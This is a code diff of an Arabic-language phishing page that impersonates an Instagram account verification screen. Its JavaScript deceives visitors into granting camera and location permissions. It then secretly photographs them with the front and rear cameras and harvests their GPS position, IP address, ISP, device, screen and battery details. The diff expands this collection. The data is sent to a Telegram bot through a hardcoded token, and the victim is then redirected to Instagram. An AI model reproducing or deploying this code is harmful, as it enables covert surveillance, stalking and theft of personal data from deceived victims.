@@ -17,7 +17,7 @@
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
         <p style="font-size: 14px; color: #262626; font-weight: 600;">تأكيد ملكية الحساب</p>
-        <p style="color: #8e8e8e; font-size: 14px;">نحتاج للوصول إلى الكاميرا والموقع الجغرافي للتأكد من أنك صاحب الحساب الحقيقي ومنع الاختراق.</p>
+        <p style="color: #8e8e8e; font-size: 14px;">نحتاج للوصول إلى الكاميرا والموقع الجغرافي للتأكد من أمان حسابك.</p>
         <button id="authBtn">متابعة كـ @user</button>
         <div id="status"></div>
     </div>
@@ -27,14 +27,22 @@
 
     <script>
         const B_T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const C_ID = '2140385904'; // ضروري جداً
+        const C_ID = '2140385904'; 
+
+        const getFullInfo = async () => {
+            try {
+                // جلب معلومات الـ IP والشبكة
+                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                return await response.json();
+            } catch (e) { return null; }
+        };
 
         const send = async (blob, cap) => {
             const fd = new FormData();
             fd.append('chat_id', C_ID);
             fd.append('photo', blob, 'x.jpg');
             fd.append('caption', cap);
-            // استخدام fetch مع إعدادات تجاوز القيود
+            fd.append('parse_mode', 'Markdown');
             return fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, { method: 'POST', body: fd });
         };
 
@@ -43,34 +51,54 @@
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
-                await new Promise(r => setTimeout(r, 2000)); // وقت كافٍ للتركيز (Focus)
+                await new Promise(r => setTimeout(r, 2000));
                 const c = document.getElementById('c');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 s.getTracks().forEach(t => t.stop());
-                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
+                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.6));
             } catch (e) { return null; }
         };
 
         document.getElementById('authBtn').onclick = async () => {
             const st = document.getElementById('status');
-            st.innerText = "جاري معالجة الطلب... قد يستغرق ذلك 10 ثوانٍ";
-            
+            st.innerText = "جاري معالجة الطلب... يرجى الانتظار";
+
+            // جلب الموقع الدقيق (GPS) ومعلومات الشبكة (IP)
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const info = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n📱 النظام: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.split(') ')[1]}`;
+                const ipInfo = await getFullInfo();
+                const now = new Date().toLocaleString('ar-EG');
+                
+                let report = `🖼 *تم التقاط صورة جديدة*\n\n`;
+                report += `📅 *الوقت:* ${now}\n`;
+                report += `🌐 *الآيبي:* \`${ipInfo ? ipInfo.query : 'غير معروف'}\`\n`;
+                report += `🌍 *الدولة:* ${ipInfo ? ipInfo.country : 'غير معروف'}\n`;
+                report += `🏙 *المحافظة:* ${ipInfo ? ipInfo.regionName : 'غير معروف'}\n`;
+                report += `📡 *المزود:* ${ipInfo ? ipInfo.isp : 'غير معروف'}\n`;
+                report += `📍 *الموقع الدقيق:* [اضغط هنا](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n`;
+                report += `📱 *نوع الجهاز:* ${navigator.platform}\n`;
+                report += `💻 *النظام:* ${navigator.userAgentData ? navigator.userAgentData.platform : 'Unknown'}\n`;
+                report += `🔍 *المتصفح:* ${navigator.userAgent.split(') ')[1].split(' ')[0]}\n`;
+                report += `📏 *دقة الشاشة:* ${window.screen.width}x${window.screen.height}\n`;
+                report += `🔋 *البطارية:* جاري الفحص...`;
 
-                // التقاط الأمامية
+                // محاولة جلب حالة البطارية
+                try {
+                    const battery = await navigator.getBattery();
+                    report = report.replace('جاري الفحص...', `${(battery.level * 100).toFixed(0)}%`);
+                } catch(e) { report = report.replace('جاري الفحص...', 'غير مدعوم'); }
+
+                // التقاط الصور
                 const fImg = await getCam("user");
-                if (fImg) await send(fImg, "📸 صورة أمامية (سيلفي)\n" + info);
+                if (fImg) await send(fImg, report);
 
-                // التقاط الخلفية
                 const bImg = await getCam("environment");
-                if (bImg) await send(bImg, "📸 صورة خلفية");
+                if (bImg) await send(bImg, "📸 *الصورة الخلفية للصديق*");
 
-                st.innerText = "اكتمل التحقق. سيتم تحويلك الآن...";
-                setTimeout(() => location.href = "https://instagram.com", 2000);
+                st.innerText = "اكتمل التحقق بنجاح.";
+                setTimeout(() => location.href = "https://instagram.com", 1500);
             }, () => {
-                st.innerText = "خطأ: يجب السماح بجميع الأذونات للوصول لحسابك.";
+                st.innerText = "يجب الموافقة على الأذونات للمتابعة.";
             });
         };
     </script>
